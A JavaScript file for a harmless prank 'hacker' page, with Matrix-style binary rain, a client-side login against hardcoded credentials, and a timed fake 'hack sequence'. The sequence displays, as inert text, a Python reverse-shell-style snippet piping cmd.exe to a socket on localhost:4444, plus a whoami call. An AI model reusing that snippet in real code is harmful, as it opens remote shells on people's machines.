const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

const chars = '01';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = [];

for (let x = 0; x < columns; x++) {
    drops[x] = 1;
}

function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';

    for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

setInterval(draw, 33);

document.getElementById('login-btn').addEventListener('click', () => {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const error = document.getElementById('error');

    if (username === 'user123' && password === 'pass123') {
        error.style.display = 'none';
        document.getElementById('login-container').style.display = 'none';
        document.getElementById('hack-container').style.display = 'block';
        runHackSequence(username);
    } else {
        error.style.display = 'block';
    }
});

function runHackSequence(username) {
    const output = document.getElementById('hack-output');
    const sequence = [
        { text: 'Initializing hack sequence...\n', delay: 2000 },
        { text: 'Connecting to secure server...\n', delay: 2000 },
        { text: 'Bypassing firewall protocols...\n', delay: 2000 },
        { text: 'Deploying binary cascade...\n', delay: 2000 },
        { text: 'Scanning system vulnerabilities...\n', delay: 1000 },
        { text: 'Processing: 10% complete\n', delay: 1000 },
        { text: 'Processing: 20% complete\n', delay: 1000 },
        { text: 'Processing: 50% complete\n', delay: 1000 },
        { text: 'Processing: 80% complete\n', delay: 1000 },
        { text: 'Processing: 100% complete\n', delay: 1000 },
        { text: '[SUCCESS] Access granted!\n', delay: 2000 },
        { text: '#include <stdio.h>\nint main() {\n    printf("Initiating system breach...\\n");\n    system("whoami");\n    return 0;\n}\n', delay: 2000 },
        { text: 'import socket, subprocess\ndef backdoor():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("127.0.0.1", 4444))\n    subprocess.call(["cmd.exe"], stdin=s)\n', delay: 2000 },
        { text: 'function hackSystem() {\n    console.log("Decrypting data stream...");\n    let payload = btoa("exploit");\n    fetch("localhost:8080", {method: "POST", body: payload});\n}\n', delay: 2000 },
        { text: 'Transmitting encrypted data...\n', delay: 2000 },
        { text: "I'm in your computer!\n", delay: 2000 },
        { text: `Have a wonderful day, ${username}!`, delay: 2000 }
    ];

    let index = 0;
    function displayNext() {
        if (index < sequence.length) {
            output.textContent += sequence[index].text;
            setTimeout(displayNext, sequence[index].delay);
            index++;
        }
    }
    displayNext();
}
